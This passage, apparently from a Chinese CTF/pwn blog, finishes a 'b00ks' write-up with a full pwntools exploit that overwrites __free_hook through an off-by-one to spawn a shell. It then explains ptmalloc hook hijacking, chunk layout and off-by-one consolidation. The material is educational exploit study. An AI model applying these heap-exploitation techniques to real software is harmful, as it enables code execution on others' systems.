<p>执行“free(2)”时，就会执行“free_hook”挂钩的函数“system”</p>
<p><img src="/2022/01/10/free_hook+off-by-one/Users/ywx813/Desktop/HeapAttack/free_hook+off-by-one/wp/1641487724350.png" alt="1641487724350"> </p>
<p>而“list_2”的“list_addr + 8”中被写入了”/bin/sh”，这里就相当于执行了“ system(“/bin/sh”) ”</p>
<p>当然用“one_gadget”也可以：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">libc_base = bookname2 + <span class="number">0x21ff0</span> </span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xe6c81</span></span><br><span class="line"><span class="comment">#system = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment">#bin_sh = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">success(<span class="string">&#x27;one_gadget &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>, p64(<span class="number">0</span>) + p64(free_hook))</span><br><span class="line">change(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">len_book,bookname,len_description,description</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Enter book name size: &#x27;</span>,<span class="built_in">str</span>(len_book))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;(Max 32 chars): &#x27;</span>,bookname)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;description size: &#x27;</span>,<span class="built_in">str</span>(len_description))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;description: &#x27;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;delete: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">index,description</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;want to edit: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;book description: &#x27;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span>(<span class="params">name</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, name)	</span><br><span class="line">	</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0xe0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0xe0</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">list1_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">list2_addr=list1_addr+<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;list1_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(list1_addr))</span><br><span class="line">success(<span class="string">&quot;list2_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(list2_addr))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x21000</span>, <span class="string">&#x27;cccc&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">1</span>) + p64(list2_addr + <span class="number">8</span>) * <span class="number">2</span> + p64(<span class="number">0x1000</span>)</span><br><span class="line">change(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">change_name(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">bookname2 = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;bookname2 &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(bookname2))</span><br><span class="line"></span><br><span class="line">libc_base = bookname2 + <span class="number">0x21ff0</span> </span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xe6c81</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">success(<span class="string">&#x27;system &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>, p64(bin_sh) + p64(free_hook))</span><br><span class="line">pause()</span><br><span class="line">change(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] list1_addr &gt;&gt; <span class="number">0x563929e21490</span></span><br><span class="line">[+] list2_addr &gt;&gt; <span class="number">0x563929e214c0</span></span><br><span class="line">[+] bookname2 &gt;&gt; <span class="number">0x7fc022a21010</span></span><br><span class="line">[+] libc_base &gt;&gt; <span class="number">0x7fc022a43000</span></span><br><span class="line">[+] system &gt;&gt; <span class="number">0x7fc022a98410</span></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>PS：</strong></p>
<p>本程序服务器的libc版本为“libc-2.23.so”可以利用这种方式来打</p>
<p>但“libc-2.29.so”以后假如了两行代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>如果“list_2”的“presize”不等于“list_1”的“size”，程序就会报错</p>
<p>导致以下代码没法执行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">change(<span class="number">1</span>, p64(bin_sh) + p64(free_hook)) <span class="comment">#这个&#x27;list_1&#x27;是伪造的</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Ahook%E5%8A%AB%E6%8C%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Ahook%E5%8A%AB%E6%8C%81/" class="post-title-link" itemprop="url">Ptmalloc算法：hook劫持</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-10 15:49:39" itemprop="dateCreated datePublished" datetime="2022-01-10T15:49:39+08:00">2022-01-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-11 16:22:50" itemprop="dateModified" datetime="2022-01-11T16:22:50+08:00">2022-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Ptmalloc算法：hook劫持"><a href="#Ptmalloc算法：hook劫持" class="headerlink" title="Ptmalloc算法：hook劫持"></a>Ptmalloc算法：hook劫持</h2><p>利用hook机制，把某个函数的hook劫持为shellcode</p>
<p>这种技术在堆利用中很常见，想要了解它，必须先了解<strong>hook机制</strong></p>
<hr>
<h2 id="钩子hook"><a href="#钩子hook" class="headerlink" title="钩子hook"></a>钩子hook</h2><p>hook直意为钩子又叫做<strong>回调函数</strong>，是一种特殊的消息处理机制，它可以监视系统或者进程中的各种事件消息，截获发往目标窗口的消息并进行处理</p>
<p>在程序中设置钩子，用来在 <strong>malloc</strong> ， <strong>realloc</strong> ， <strong>free</strong> 的时候，对其进行检查，可以看到对应的函数调用后的地址是什么</p>
<p><strong>原理：</strong></p>
<p>hook本质上就是一个函数指针，可以指向不同的函数，从而完成不同的功能</p>
<p><strong>设计理念：</strong></p>
<p>我们在写main函数的时候，可能还不知道它会完成什么功能，这时候留下函数指针作为接口，可以挂上不同的函数完成不同的功能，究竟执行什么功能由钩子函数的编写者完成，钩子的出现体系了程序模块化的思想</p>
<p><strong>案例：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun1</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i am fun1\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun2</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i am fun2\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> (* fun)(<span class="keyword">void</span>); <span class="comment">//定义一个函数指针</span></span><br><span class="line">  </span><br><span class="line">    fun = fun1;		<span class="comment">// 让fun指向fun1（首地址）</span></span><br><span class="line">    fun();			<span class="comment">// 执行fun</span></span><br><span class="line">    </span><br><span class="line">    fun = fun2;   	<span class="comment">// 让fun指向fun2（首地址）</span></span><br><span class="line">    fun(); 			<span class="comment">// 执行fun</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./test</span><br><span class="line">i am fun1</span><br><span class="line">i am fun2</span><br></pre></td></tr></table></figure>
<p>这里的函数“fun1”和函数“fun2”就是hook把函数指针fun指向fun1和fun2的过程称为“挂钩子”</p>
<h2 id="libc中的hook"><a href="#libc中的hook" class="headerlink" title="libc中的hook"></a>libc中的hook</h2><p>libc中最常见，也是堆利用中最常见的两种hook：malloc_hook，free_hook</p>
<p>接下来以“malloc_hook”为例，分析一下hook的具体实现：</p>
<p>ptmalloc 定义了一个<strong>全局钩子 malloc_hook</strong>，这个钩子会被赋值为 <strong>malloc_hook_ini</strong> 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">weak_variable</span> <span class="params">(*__malloc_hook)</span></span></span><br><span class="line"><span class="function">    <span class="params">(<span class="keyword">size_t</span> __size, <span class="keyword">const</span> <span class="keyword">void</span> *)</span> </span>= malloc_hook_ini;</span><br></pre></td></tr></table></figure>
<p>而函数malloc会调用 malloc_hook ，那么在 <strong>第一次调用malloc函数</strong> 时会执行 malloc_hook，也就是执行了 <strong>malloc_hook_ini</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">malloc_hook_ini</span> <span class="params">(<span class="keyword">size_t</span> sz, <span class="keyword">const</span> <span class="keyword">void</span> *caller)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __malloc_hook = <span class="literal">NULL</span>;</span><br><span class="line">  ptmalloc_init ();</span><br><span class="line">  <span class="keyword">return</span> __libc_malloc (sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见在 malloc_hook_ini 会把 malloc_hook <strong>置空</strong>，然后调用 <strong>ptmalloc_init</strong> 函数，完成对 ptmalloc 的初始化，最后再次调用 malloc_hook，但是这次的 malloc_hook 已经置空，从而继续执行剩下的代码</p>
<p>第一次调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc(__libc_malloc) -&gt; __malloc_hook(malloc_hook_ini) -&gt; ptmalloc_init -&gt; __libc_malloc -&gt; _int_malloc</span><br></pre></td></tr></table></figure>
<p>再次调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc(__libc_malloc) -&gt; _int_malloc</span><br></pre></td></tr></table></figure>
<ul>
<li>malloc_hook_ini：对malloc_hook进行初始化的函数，代码已给出</li>
<li>ptmalloc_init：对整个ptmalloc框架进行初始化的函数，以后分析</li>
<li>__libc_malloc：用于初始化malloc，以后分析</li>
<li>_int_malloc：用于内存分配的函数，是ptmalloc的核心点，以后分析</li>
</ul>
<p>最后，malloc_hook会指向一个“检查函数”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">function</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">void</span> * caller)</span></span></span><br></pre></td></tr></table></figure>
<p>caller：表示用malloc申请空间的“可写入地址”（ fd&amp;bk 所在处）</p>
<p>使用malloc的时候就可以返回其“可写入地址”了</p>
<h2 id="hook劫持"><a href="#hook劫持" class="headerlink" title="hook劫持"></a>hook劫持</h2><p>hook劫持的基本操作就是：在hook的地址中写入shellcode的地址，可以把hook地址写在<strong>某个固定地址上</strong>，然后在这个地址中写入shellcode，这样就挂钩完毕了</p>
<p>那么问题的关键就是找hook的地址：</p>
<p>一，如果知道libc版本，可以直接引入libc库，用ELF工具进行查找</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>这种方法需要泄露libc基地址</p>
<p>二，还可以用“main_arena”来定位“malloc_hook”</p>
<p>malloc_hook位于main_arena上方16字节</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Ahook%E5%8A%AB%E6%8C%81/1639154237609.png" class width="1639154237609"> 
<p>当small chunk被释放时，它的fd、bk指向一个指针，这个指针指向top chunk地址，这个指针保存在<strong>“main_arena+0x58”</strong></p>
<p>找到合适的small chunk再free掉，然后通过“main_arena”获取“malloc_hook”</p>
<p>​        // 等到分析 Unsortedbin attack 的时候，再分析这种hook劫持技术</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/" class="post-title-link" itemprop="url">Ptmalloc算法：off-by-one</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-10 15:49:35" itemprop="dateCreated datePublished" datetime="2022-01-10T15:49:35+08:00">2022-01-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-08-11 14:22:24" itemprop="dateModified" datetime="2022-08-11T14:22:24+08:00">2022-08-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Ptmalloc算法：off-by-one"><a href="#Ptmalloc算法：off-by-one" class="headerlink" title="Ptmalloc算法：off-by-one"></a>Ptmalloc算法：off-by-one</h2><p>在堆溢出的基础上，只溢出1字节，这就是<strong>off-by-one</strong></p>
<p>想了解这个漏洞必须先了解 <strong>chunk</strong> 的结构 </p>
<hr>
<h2 id="数据结构chunk"><a href="#数据结构chunk" class="headerlink" title="数据结构chunk"></a>数据结构chunk</h2><p><strong>什么是chunk？</strong>用户申请的内存空间就被称为chunk</p>
<p>在ptmalloc算法中，用户申请的内存空间以chunk为单位进行管理，它的结构入下图：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>一共有6个部分，其中最后两个部分是 <strong>large chunk</strong> 特有的</p>
<ul>
<li>prev_size：相邻的前一个堆块大小（该字段不计入当前堆块的大小计算，free状态时：数据为前一个chunk的大小，allocate状态时：用于前一个chunk写入数据）</li>
<li>size：本堆块的长度（长度计算方式：<strong>size字段长度+用户申请的长度+对齐</strong>，最后3位标志位）</li>
<li>fd&amp;bk：双向指针，用于组成一个双向空闲链表</li>
<li>fd_nextsize：指向前一个与当前 chunk 大小不同的第一个空闲块 </li>
<li>bk_nextsize：指向后一个与当前 chunk 大小不同的第一个空闲块 </li>
</ul>
<p><strong>chunk有两种状态</strong>：allocate chunk 和 free chunk</p>
<p>allocate chunk：用户正在使用的chunk，fd&amp;bk处用于存放数据</p>
<p>free chunk：程序中空闲的chunk，fd&amp;bk分别为指向 “后一个free chunk”和“前一个free chunk”</p>
<p>也就是说，只有allocate chunk中会存放数据，而free chunk会以<strong>双向链表</strong>的形式存储起来</p>
<p>allocate chunk：</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1641452666463-1659683450531.png" class width="1641452666463"> 
<p>free chunk：</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1641452614487-1659683450532.png" class width="1641452614487"> 
<p><strong>程序该怎样分辨chunk的状态？</strong></p>
<p>在解释这一点之前，先要了解一下<strong>内存对齐</strong></p>
<p>内存对齐是为了“程序执行效率”而诞生的一种机制，它可以优化CPU识别地址的效率</p>
<p>glibc的堆内存对齐机制：</p>
<p>32位：<br>最少分配16字节堆，8字节对齐，每次增加8<br>其中4字节为头部，申请1-12堆，分配16字节堆</p>
<p>64位：<br>最少分配32字节堆，16字节对齐，每次增加16<br>其中8字节为头部，申请1-24堆，分配32字节堆</p>
<p>不管是32位（8字节对齐），还是64位（16字节对齐），chunk的大小都是 <strong>8的倍数</strong> ，也就是说，<strong>chunk -&gt; size</strong> 的最后3位恒为“0”，ptmalloc算法干脆就把这3位当成了标志位，用于描述一些chunk的信息</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1641455617594-1659683450532.png" class width="1641455617594">  
<p>P位：指示相邻的前一个堆块是alloc还是free</p>
<p>M位：是否属于主进程</p>
<p>N位：是否由 mmap() 分配</p>
<h2 id="chunk分类"><a href="#chunk分类" class="headerlink" title="chunk分类"></a>chunk分类</h2><p>除了根据P位进行的分类：allocate chunk &amp; free chunk </p>
<p>还有：top chunk &amp; last remainder chunk </p>
<p>glibc提供给用户的chunk主要就分为这4类</p>
<ul>
<li>top chunk：处于一个arena的最顶部(即最高内存地址处)的chunk</li>
<li>last remainder chunk：unsorted bin中的最后一个chunk </li>
</ul>
<p>这里引入了“bin”的概念，不过我想在UAF中分析“bin”，这里就先提一下吧：</p>
<ul>
<li>small chunk：小于512（1024）字节的chunk</li>
<li>large chunk：大于512（1024）字节的chunk</li>
</ul>
<h2 id="chunk合并"><a href="#chunk合并" class="headerlink" title="chunk合并"></a>chunk合并</h2><p>先说说off-by-one的效果</p>
<p>两个相邻的chunk中（“chunk1”和“chunk2”），对“chunk1”进行操作（通常要用到UAF）使其溢出一字节到“chunk2”中，而它就会覆盖“chunk2”的presize的最后一字节</p>
<p>看上去好像没什么作用，但它的威力的确很大</p>
<p>因为在free掉“chunk2”后会发生 <strong>chunk合并</strong>，一共有两种合成方式：</p>
<p><strong>向前合并</strong>（将要被free的chunk作为素材，被后一个chunk合并）</p>
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1639027341437-1659683450532.png" class width="1639027341437"> 
<img src="/2022/01/10/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9Aoff-by-one/1639027400761-1659683450532.png" class width="1639027400761"> 
